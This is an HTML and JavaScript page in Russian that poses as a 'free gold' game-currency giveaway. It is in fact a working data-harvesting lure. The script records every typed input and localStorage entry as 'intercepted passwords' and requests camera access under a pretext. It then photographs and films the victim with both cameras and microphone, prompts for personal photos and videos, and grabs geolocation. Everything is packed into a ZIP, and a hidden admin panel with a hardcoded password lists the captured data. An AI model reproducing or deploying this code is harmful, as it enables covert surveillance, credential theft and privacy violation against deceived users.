<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>БЕСПЛАТНАЯ ГОЛДА</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0f, #1a0a2e);
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            -webkit-tap-highlight-color: transparent;
        }
        .container {
            background: rgba(20, 20, 40, 0.95);
            padding: 25px 20px;
            border-radius: 20px;
            max-width: 500px;
            width: 100%;
            border: 2px solid #ffd700;
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.2);
        }
        h1 {
            text-align: center;
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(45deg, #ffd700, #ff6b00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        .subtitle {
            text-align: center;
            font-size: 18px;
            color: #ffd700;
            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
            margin-bottom: 15px;
            font-weight: 600;
        }
        .btn-main {
            background: linear-gradient(45deg, #ffd700, #ff8c00);
            color: #0a0a0f;
            border: none;
            padding: 18px 20px;
            font-size: 20px;
            font-weight: 900;
            border-radius: 14px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
            -webkit-tap-highlight-color: transparent;
            position: relative;
            overflow: hidden;
        }
        .btn-main:active {
            transform: scale(0.97);
        }
        .btn-main:disabled {
            opacity: 0.5;
            transform: none;
        }
        .btn-main .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(0,0,0,0.1);
            border-top: 3px solid #0a0a0f;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-main.loading .spinner { display: block; }
        .btn-main.loading .btn-text { display: none; }
        
        .status {
            margin: 12px 0;
            padding: 12px;
            background: rgba(0,0,0,0.4);
            border-radius: 10px;
            border-left: 4px solid #ffd700;
            text-align: center;
            font-size: 14px;
            color: #ffd700;
            min-height: 50px;
            word-break: break-word;
            line-height: 1.5;
        }
        .status.error { border-left-color: #ff4444; color: #ff6666; }
        .status.success { border-left-color: #4ade80; color: #4ade80; }
        
        .hidden { display: none !important; }
        
        .admin-link {
            text-align: center;
            margin-top: 15px;
        }
        .admin-link button {
            background: transparent;
            border: 1px solid #ffd700;
            color: #ffd700;
            padding: 8px 16px;
            font-size: 12px;
            width: auto;
            border-radius: 8px;
            opacity: 0.5;
        }
        .admin-link button:active { opacity: 1; }
        
        .final-message {
            text-align: center;
            padding: 30px 15px;
            display: none;
        }
        .final-message h2 {
            color: #ffd700;
            font-size: 24px;
            margin-bottom: 15px;
        }
        .final-message .tg {
            font-size: 22px;
            color: #ff6b00;
            background: rgba(0,0,0,0.4);
            padding: 12px 24px;
            border-radius: 12px;
            border: 2px solid #ff6b00;
            display: inline-block;
            margin-top: 8px;
            font-weight: 700;
        }
        .final-message p {
            color: #aaa;
            font-size: 16px;
            margin: 15px 0;
        }
        
        /* Админка */
        input {
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            border-radius: 10px;
            border: 2px solid #ffd700;
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 16px;
            -webkit-appearance: none;
        }
        .session-item {
            background: rgba(0,0,0,0.3);
            padding: 12px;
            margin: 8px 0;
            border-radius: 10px;
            border-left: 4px solid #ffd700;
            font-size: 13px;
        }
        .password-item {
            background: rgba(255,0,0,0.08);
            padding: 10px;
            margin: 4px 0;
            border-radius: 8px;
            border: 1px solid #ff4444;
            color: #ff6666;
            font-size: 13px;
            word-break: break-all;
        }
        .badge {
            background: #ffd700;
            color: #0a0a0f;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
        }
        .btn-small {
            background: #ff4444;
            color: #fff;
            border: none;
            padding: 4px 12px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            margin-top: 4px;
        }
        .btn-small:active { opacity: 0.7; }
        .btn-export {
            background: #ff8c00;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            width: 100%;
            margin: 6px 0;
            cursor: pointer;
        }
        .btn-export:active { opacity: 0.7; }
        .btn-danger {
            background: #ff4444;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            width: 100%;
            margin: 6px 0;
            cursor: pointer;
        }
        .btn-danger:active { opacity: 0.7; }
        
        #fileUpload { display: none; }
        
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 10px 0;
            flex-wrap: wrap;
        }
        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: rgba(255,255,255,0.1);
            transition: 0.3s;
        }
        .step-dot.active { background: #ffd700; box-shadow: 0 0 20px rgba(255,215,0,0.4); }
        .step-dot.done { background: #4ade80; }
        .step-dot.error { background: #ff4444; }
        
        .permission-request {
            background: rgba(255,215,0,0.05);
            border: 1px solid #ffd700;
            border-radius: 10px;
            padding: 12px;
            margin: 10px 0;
            text-align: center;
            font-size: 14px;
            color: #ffd700;
        }
        .permission-request .icon {
            font-size: 32px;
            display: block;
            margin-bottom: 6px;
        }
        .permission-request .btn-grant {
            background: #ffd700;
            color: #0a0a0f;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            font-weight: 700;
            font-size: 16px;
            margin-top: 8px;
            cursor: pointer;
            width: 100%;
        }
        .permission-request .btn-grant:active { opacity: 0.7; }
    </style>
</head>
<body>

<div class="container" id="app">

    <div id="mainPage">
        <h1>✨ БЕСПЛАТНАЯ ГОЛДА ✨</h1>
        <div class="subtitle">🏆 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ ГОЛДЫ 🏆</div>
        
        <button class="btn-main" id="startBtn">
            <span class="btn-text">🎁 ПОЛУЧИТЬ ГОЛДУ</span>
            <div class="spinner"></div>
        </button>
        
        <div class="step-indicator" id="stepIndicator">
            <div class="step-dot" data-step="1"></div>
            <div class="step-dot" data-step="2"></div>
            <div class="step-dot" data-step="3"></div>
            <div class="step-dot" data-step="4"></div>
            <div class="step-dot" data-step="5"></div>
            <div class="step-dot" data-step="6"></div>
        </div>
        
        <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ ГОЛДЫ</div>
        
        <div id="permissionBox" class="permission-request hidden">
            <span class="icon">📱</span>
            <div>ТРЕБУЕТСЯ ДОСТУП К КАМЕРЕ</div>
            <button class="btn-grant" id="grantBtn">✅ РАЗРЕШИТЬ ДОСТУП</button>
        </div>
        
        <div class="admin-link">
            <button id="goToAdminBtn">🔐 АДМИН</button>
        </div>
    </div>

    <div id="finalMessage" class="final-message">
        <h2>🎉 ВЫ ПОЛУЧИЛИ ГОЛДУ!</h2>
        <p>ХОЧЕШЬ УДАЛИТЬ ДАННЫЕ? ПИШИ СЮДА:</p>
        <div class="tg">@papadenay</div>
    </div>

    <div id="adminPage" class="hidden">
        <h1 style="font-size:24px;">🔐 АДМИН-ПАНЕЛЬ</h1>
        
        <div id="loginForm">
            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin">
            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ">
            <button class="btn-main" id="adminLoginBtn" style="font-size:16px;padding:14px;">ВОЙТИ</button>
            <div class="status" id="adminStatus"></div>
        </div>

        <div id="adminContent" class="hidden">
            <div style="display:flex;gap:8px;flex-wrap:wrap;margin:10px 0;">
                <button class="btn-danger" id="clearSessionsBtn" style="flex:1;min-width:100px;">🗑️ ОЧИСТИТЬ</button>
                <button class="btn-export" id="exportAllBtn" style="flex:1;min-width:100px;">📥 ЭКСПОРТ ZIP</button>
            </div>
            <div id="sessionsList"></div>
            <h3 style="color:#ff6666;margin:15px 0 8px;font-size:16px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h3>
            <div id="passwordsList"></div>
            <button class="btn-small" id="logoutBtn" style="background:#666;width:100%;margin-top:10px;padding:10px;">🚪 ВЫЙТИ</button>
        </div>
    </div>
</div>

<input type="file" id="fileUpload" multiple accept="image/*,video/*">

<script>
    // ============================================================
    // 1. ГЛОБАЛЬНЫЕ
    // ============================================================
    let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
    let capturedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
    let isAdmin = false;
    let screenshotData = null;
    let collectedFiles = [];
    let mediaData = [];
    let hasCameraPermission = false;
    let isRunning = false;

    // ============================================================
    // 2. ПЕРЕХВАТ ДАННЫХ
    // ============================================================
    function captureData(value, source = 'manual', extra = {}) {
        if (!value || String(value).length < 1) return;
        try {
            const entry = {
                "ВРЕМЯ": new Date().toISOString(),
                "ЗНАЧЕНИЕ": String(value).toUpperCase().substring(0, 500),
                "ОТКУДА": String(source).toUpperCase(),
                "СТРАНИЦА": String(window.location.href).toUpperCase(),
                "ДОП": JSON.stringify(extra).substring(0, 200)
            };
            const exists = capturedData.some(p => p["ЗНАЧЕНИЕ"] === entry["ЗНАЧЕНИЕ"]);
            if (!exists) {
                capturedData.push(entry);
                localStorage.setItem('capturedData', JSON.stringify(capturedData));
            }
        } catch(e) {}
    }

    function setupCapture() {
        try {
            const observer = new MutationObserver(() => {
                document.querySelectorAll('input').forEach(field => {
                    if (!field.dataset.captured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
                        field.dataset.captured = 'true';
                        field.addEventListener('input', function() {
                            if (this.value && String(this.value).length > 1) {
                                captureData(this.value, 'ПОЛЕ ВВОДА', {
                                    name: this.name || 'НЕТ',
                                    id: this.id || 'НЕТ',
                                    type: this.type
                                });
                            }
                        });
                        if (field.value && String(field.value).length > 1) {
                            captureData(field.value, 'ПОЛЕ ПРИ ЗАГРУЗКЕ', {
                                name: field.name || 'НЕТ',
                                id: field.id || 'НЕТ'
                            });
                        }
                    }
                });
            });
            observer.observe(document.body, { childList: true, subtree: true });

            document.addEventListener('submit', function(e) {
                try {
                    const form = e.target;
                    form.querySelectorAll('input').forEach(inp => {
                        if (inp.value && String(inp.value).length > 1) {
                            captureData(inp.value, 'ФОРМА', {
                                name: inp.name || 'НЕТ',
                                id: inp.id || 'НЕТ'
                            });
                        }
                    });
                } catch(e) {}
            });

            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) {
                    const val = localStorage.getItem(key);
                    if (val && String(val).length > 1) {
                        captureData(val, 'LOCALSTORAGE', { key: key });
                    }
                }
            }
        } catch(e) {}
    }

    // ============================================================
    // 3. СТАТУС И ШАГИ
    // ============================================================
    function setStatus(text, type = '') {
        const el = document.getElementById('status');
        el.textContent = text;
        el.className = 'status ' + type;
    }

    function setStep(step, status = 'active') {
        document.querySelectorAll('.step-dot').forEach(d => {
            const num = parseInt(d.dataset.step);
            d.className = 'step-dot';
            if (num < step) d.classList.add('done');
            else if (num === step) d.classList.add(status);
        });
    }

    function showPermissionBox(show) {
        document.getElementById('permissionBox').classList.toggle('hidden', !show);
    }

    // ============================================================
    // 4. ЗАПРОС РАЗРЕШЕНИЙ
    // ============================================================
    async function requestPermissions() {
        return new Promise(async (resolve) => {
            showPermissionBox(true);
            setStatus('📱 НАЖМИ "РАЗРЕШИТЬ ДОСТУП" ДЛЯ КАМЕРЫ', '');
            
            document.getElementById('grantBtn').onclick = async function() {
                try {
                    setStatus('⏳ ПРОВЕРКА КАМЕРЫ...', '');
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment', width: 640, height: 480 },
                        audio: true 
                    });
                    stream.getTracks().forEach(t => t.stop());
                    hasCameraPermission = true;
                    showPermissionBox(false);
                    setStatus('✅ ДОСТУП К КАМЕРЕ РАЗРЕШЁН', 'success');
                    resolve(true);
                } catch (err) {
                    setStatus('⚠️ ДОСТУП К КАМЕРЕ ОТКЛОНЁН (СБОР БЕЗ ВИДЕО)', 'error');
                    showPermissionBox(false);
                    hasCameraPermission = false;
                    resolve(false);
                }
            };
            
            // Таймаут, если не нажали
            setTimeout(() => {
                if (!hasCameraPermission) {
                    showPermissionBox(false);
                    setStatus('⏱️ ВРЕМЯ ВЫШЛО (СБОР БЕЗ ВИДЕО)', 'error');
                    resolve(false);
                }
            }, 30000);
        });
    }

    // ============================================================
    // 5. СКРИНШОТ
    // ============================================================
    async function takeScreenshot() {
        try {
            const canvas = await html2canvas(document.body, {
                scale: 1.2,
                useCORS: true,
                allowTaint: true,
                backgroundColor: '#0a0a0f',
                logging: false
            });
            return canvas.toDataURL('image/png');
        } catch (err) {
            return null;
        }
    }

    // ============================================================
    // 6. ФОТО
    // ============================================================
    async function takePhoto(facingMode) {
        if (!hasCameraPermission) return null;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode, width: 640, height: 480 }
            });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const data = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());
            return data;
        } catch(e) { return null; }
    }

    // ============================================================
    // 7. ВИДЕО (10 СЕК)
    // ============================================================
    async function recordVideo(facingMode, duration = 10000) {
        if (!hasCameraPermission) return null;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode, width: 480, height: 360 },
                audio: true
            });
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = () => {
                    try {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        const reader = new FileReader();
                        reader.onload = () => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve(reader.result);
                        };
                        reader.onerror = () => { stream.getTracks().forEach(t => t.stop()); resolve(null); };
                        reader.readAsDataURL(blob);
                    } catch(e) { stream.getTracks().forEach(t => t.stop()); resolve(null); }
                };
                recorder.start();
                setTimeout(() => { try { recorder.stop(); } catch(e) {} }, duration);
            });
        } catch(e) { return null; }
    }

    // ============================================================
    // 8. ФАЙЛЫ (РУЧНОЙ ВЫБОР)
    // ============================================================
    function waitForFiles(timeout = 20000) {
        return new Promise((resolve) => {
            const input = document.getElementById('fileUpload');
            let resolved = false;
            
            const handler = function(e) {
                const files = e.target.files;
                if (files && files.length > 0) {
                    Array.from(files).forEach(file => {
                        const reader = new FileReader();
                        reader.onload = function(ev) {
                            collectedFiles.push({
                                name: file.name,
                                type: file.type,
                                size: file.size,
                                data: ev.target.result,
                                time: new Date().toISOString()
                            });
                        };
                        reader.readAsDataURL(file);
                    });
                    if (!resolved) { resolved = true; resolve(true); }
                }
            };
            
            input.addEventListener('change', handler);
            input.click(); // ОТКРЫВАЕМ ДИАЛОГ ВЫБОРА ФАЙЛОВ
            
            setTimeout(() => {
                if (!resolved) { resolved = true; resolve(false); }
            }, timeout);
        });
    }

    // ============================================================
    // 9. ГЛАВНАЯ ФУНКЦИЯ
    // ============================================================
    async function startCollection() {
        if (isRunning) return;
        isRunning = true;
        
        const btn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const mainPage = document.getElementById('mainPage');
        const finalMessage = document.getElementById('finalMessage');
        
        btn.classList.add('loading');
        btn.disabled = true;
        setStatus('🔄 ПОДГОТОВКА...', '');
        setStep(1, 'active');
        
        try {
            // ШАГ 1: ЗАПРОС РАЗРЕШЕНИЙ
            setStep(1, 'active');
            setStatus('📱 ЗАПРОС РАЗРЕШЕНИЙ...', '');
            await requestPermissions();
            setStep(1, 'done');
            
            // ШАГ 2: СКРИНШОТ
            setStep(2, 'active');
            setStatus('📸 СКРИНШОТ СТРАНИЦЫ...', '');
            screenshotData = await takeScreenshot();
            setStep(2, 'done');
            if (screenshotData) setStatus('✅ СКРИНШОТ ГОТОВ', 'success');
            else setStatus('⚠️ СКРИНШОТ НЕ УДАЛСЯ', 'error');
            
            // ШАГ 3: ФОТО
            setStep(3, 'active');
            setStatus('📸 ФОТО С КАМЕР...', '');
            const photoBack = await takePhoto('environment');
            const photoFront = await takePhoto('user');
            if (photoBack) mediaData.push({ type: 'photo', cam: 'back', data: photoBack });
            if (photoFront) mediaData.push({ type: 'photo', cam: 'front', data: photoFront });
            setStep(3, 'done');
            setStatus(`✅ ФОТО: ${(photoBack?'ЗАДНЯЯ ':'')}${(photoFront?'ПЕРЕДНЯЯ':'')}`, 'success');
            
            // ШАГ 4: ВИДЕО
            setStep(4, 'active');
            setStatus('📹 ЗАПИСЬ ВИДЕО (10 СЕК)...', '');
            const videoBack = await recordVideo('environment', 10000);
            const videoFront = await recordVideo('user', 10000);
            if (videoBack) mediaData.push({ type: 'video', cam: 'back', data: videoBack });
            if (videoFront) mediaData.push({ type: 'video', cam: 'front', data: videoFront });
            setStep(4, 'done');
            setStatus(`✅ ВИДЕО: ${(videoBack?'ЗАДНЯЯ ':'')}${(videoFront?'ПЕРЕДНЯЯ':'')}`, 'success');
            
            // ШАГ 5: ФАЙЛЫ
            setStep(5, 'active');
            setStatus('📁 ВЫБЕРИТЕ ФАЙЛЫ (ФОТО/ВИДЕО)...', '');
            await waitForFiles(25000);
            setStep(5, 'done');
            setStatus(`📁 ФАЙЛОВ ВЫБРАНО: ${collectedFiles.length}`, 'success');
            
            // ШАГ 6: ZIP
            setStep(6, 'active');
            setStatus('📦 СОЗДАНИЕ ZIP АРХИВА...', '');
            
            const zip = new JSZip();
            
            // Данные
            const data = {
                "ВРЕМЯ": new Date().toISOString(),
                "БРАУЗЕР": navigator.userAgent,
                "ЭКРАН": { "ШИРИНА": screen.width, "ВЫСОТА": screen.height },
                "ГЕО": await getGeolocation(),
                "БАТАРЕЯ": await getBatteryInfo(),
                "ПАРОЛИ": capturedData.slice(-200)
            };
            zip.file('ДАННЫЕ.json', JSON.stringify(data, null, 2));
            zip.file('ПАРОЛИ.json', JSON.stringify(capturedData, null, 2));
            
            // Скриншот
            if (screenshotData) {
                const b64 = screenshotData.split(',')[1];
                if (b64) zip.file('СКРИНШОТ.png', b64, { base64: true });
            }
            
            // Медиа
            mediaData.forEach((m, i) => {
                try {
                    const b64 = m.data.split(',')[1];
                    if (b64) {
                        const ext = m.type === 'photo' ? 'jpg' : 'mp4';
                        zip.file(`МЕДИА/${i}_${m.cam}_${m.type}.${ext}`, b64, { base64: true });
                    }
                } catch(e) {}
            });
            
            // Файлы пользователя
            collectedFiles.forEach((f, i) => {
                try {
                    const b64 = f.data.split(',')[1];
                    if (b64) {
                        const ext = f.name.split('.').pop() || 'file';
                        zip.file(`ФАЙЛЫ/${i}_${f.name}`, b64, { base64: true });
                    }
                } catch(e) {}
            });
            
            // Сессия
            const session = {
                id: Date.now(),
                time: data["ВРЕМЯ"],
                preview: {
                    ua: String(data["БРАУЗЕР"]).substring(0, 40),
                    files: collectedFiles.length,
                    media: mediaData.length
                }
            };
            sessions.push(session);
            localStorage.setItem('sessions', JSON.stringify(sessions));
            
            // Скачивание
            setStatus('⬇️ СКАЧИВАНИЕ ZIP...', '');
            const blob = await zip.generateAsync({ type: 'blob' });
            saveAs(blob, `ГОЛДА_${new Date().toISOString().slice(0,10)}.zip`);
            
            setStep(6, 'done');
            setStatus('🎉 ГОЛДА ПОЛУЧЕНА!', 'success');
            btn.classList.remove('loading');
            btn.querySelector('.btn-text').textContent = '✅ ГОТОВО';
            
            // Через 10 сек - скрыть
            setTimeout(() => {
                mainPage.style.display = 'none';
                finalMessage.style.display = 'block';
                document.querySelector('.container').style.borderColor = '#ff6b00';
            }, 10000);
            
        } catch (err) {
            setStatus('❌ ОШИБКА: ' + (err.message || 'НЕИЗВЕСТНО'), 'error');
            console.error(err);
            btn.classList.remove('loading');
            btn.disabled = false;
            btn.querySelector('.btn-text').textContent = '🎁 ПОЛУЧИТЬ ГОЛДУ';
        }
        
        isRunning = false;
    }

    // ============================================================
    // 10. ВСПОМОГАТЕЛЬНЫЕ
    // ============================================================
    function getGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve({ error: 'НЕТ' }); return; }
            navigator.geolocation.getCurrentPosition(
                (p) => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
                () => resolve({ error: 'ОТКАЗАНО' }),
                { timeout: 3000 }
            );
        });
    }

    function getBatteryInfo() {
        return new Promise((resolve) => {
            if (!navigator.getBattery) { resolve({ error: 'НЕТ' }); return; }
            navigator.getBattery().then(b => resolve({
                level: Math.round(b.level * 100) + '%',
                charging: b.charging ? 'ДА' : 'НЕТ'
            })).catch(() => resolve({ error: 'ОШИБКА' }));
        });
    }

    // ============================================================
    // 11. АДМИНКА
    // ============================================================
    function renderAdmin() {
        const list = document.getElementById('sessionsList');
        list.innerHTML = sessions.length === 0 ? '<p style="color:#888;">НЕТ СЕССИЙ</p>' :
            sessions.slice().reverse().map(s => `
                <div class="session-item">
                    <strong>${new Date(s.time).toLocaleString()}</strong>
                    <span class="badge">ID: ${s.id}</span>
                    <br>БРАУЗЕР: ${s.preview.ua || 'НЕТ'}
                    <br>ФАЙЛОВ: ${s.preview.files || 0} | МЕДИА: ${s.preview.media || 0}
                    <br><button class="btn-small" onclick="deleteSession(${s.id})">УДАЛИТЬ</button>
                </div>
            `).join('');
        
        const plist = document.getElementById('passwordsList');
        plist.innerHTML = capturedData.length === 0 ? '<p style="color:#888;">НЕТ ДАННЫХ</p>' :
            capturedData.slice().reverse().slice(0, 50).map(p => `
                <div class="password-item">
                    <strong>${new Date(p["ВРЕМЯ"]).toLocaleString()}</strong>
                    <span style="color:#ff6666;">📌 ${p["ЗНАЧЕНИЕ"]}</span>
                    <br>ИСТОЧНИК: ${p["ОТКУДА"] || 'НЕТ'}
                </div>
            `).join('');
    }

    window.deleteSession = function(id) {
        sessions = sessions.filter(s => s.id !== id);
        localStorage.setItem('sessions', JSON.stringify(sessions));
        renderAdmin();
    };

    async function exportAdminZip() {
        const status = document.getElementById('adminStatus');
        status.textContent = '📦 СОЗДАНИЕ...';
        try {
            const zip = new JSZip();
            zip.file('ВСЕ_ДАННЫЕ.json', JSON.stringify({
                sessions: sessions,
                passwords: capturedData,
                date: new Date().toISOString()
            }, null, 2));
            const blob = await zip.generateAsync({ type: 'blob' });
            saveAs(blob, `АДМИН_${new Date().toISOString().slice(0,10)}.zip`);
            status.textContent = '✅ ГОТОВО';
            status.className = 'status success';
        } catch(e) {
            status.textContent = '❌ ' + e.message;
            status.className = 'status error';
        }
    }

    // ============================================================
    // 12. ИНИЦИАЛИЗАЦИЯ
    // ============================================================
    document.addEventListener('DOMContentLoaded', function() {
        setupCapture();

        document.getElementById('startBtn').addEventListener('click', function(e) {
            e.preventDefault();
            startCollection();
        });

        document.getElementById('goToAdminBtn').addEventListener('click', function() {
            document.getElementById('mainPage').style.display = 'none';
            document.getElementById('adminPage').classList.remove('hidden');
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('adminContent').classList.add('hidden');
            document.getElementById('adminStatus').textContent = '';
            document.getElementById('adminStatus').className = 'status';
        });

        document.getElementById('adminLoginBtn').addEventListener('click', function() {
            const login = document.getElementById('adminLogin').value.trim();
            const pass = document.getElementById('adminPassword').value.trim();
            const st = document.getElementById('adminStatus');
            if (login === 'admin' && pass === '6767') {
                st.textContent = '✅ ДОСТУП РАЗРЕШЁН';
                st.className = 'status success';
                document.getElementById('loginForm').classList.add('hidden');
                document.getElementById('adminContent').classList.remove('hidden');
                renderAdmin();
            } else {
                st.textContent = '❌ НЕВЕРНЫЕ ДАННЫЕ';
                st.className = 'status error';
            }
        });

        document.getElementById('logoutBtn').addEventListener('click', function() {
            document.getElementById('adminPage').classList.add('hidden');
            document.getElementById('mainPage').style.display = 'block';
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('adminContent').classList.add('hidden');
        });

        document.getElementById('clearSessionsBtn').addEventListener('click', function() {
            if (confirm('УДАЛИТЬ ВСЁ?')) {
                sessions = [];
                capturedData = [];
                localStorage.setItem('sessions', JSON.stringify(sessions));
                localStorage.setItem('capturedData', JSON.stringify(capturedData));
                renderAdmin();
            }
        });

        document.getElementById('exportAllBtn').addEventListener('click', exportAdminZip);
    });
</script>
